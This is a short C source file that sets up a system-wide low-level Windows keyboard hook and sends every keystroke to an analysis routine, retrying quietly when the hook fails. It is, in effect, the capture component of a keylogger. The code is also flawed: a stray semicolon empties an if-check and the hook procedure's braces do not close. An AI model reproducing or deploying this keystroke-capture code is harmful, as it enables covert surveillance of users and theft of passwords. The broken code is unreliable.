#include "header.h"

HHOOK hook;
KBDLLHOOKSTRUCT keyboard_struct;

void StartKeyBoardHook()
{
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProcedure, NULL, 0)))
	{
		// HOOK ERROR
		Sleep(10000);
		StartKeyBoardHook();
	}
}


LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
{
	char c;
	bool maj;

	keyboard_struct = *((KBDLLHOOKSTRUCT*)lParam);
	if (nCode >= 0);
	{
		if (wParam == WM_KEYDOWN)
			analyse_keyboard_status(keyboard_struct.vkCode, 0);
		else if (wParam == WM_SYSKEYDOWN)
			analyse_keyboard_status(keyboard_struct.vkCode, 1);
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

void ReleaseHook()
{
	UnhookWindowsHookEx(hook);
}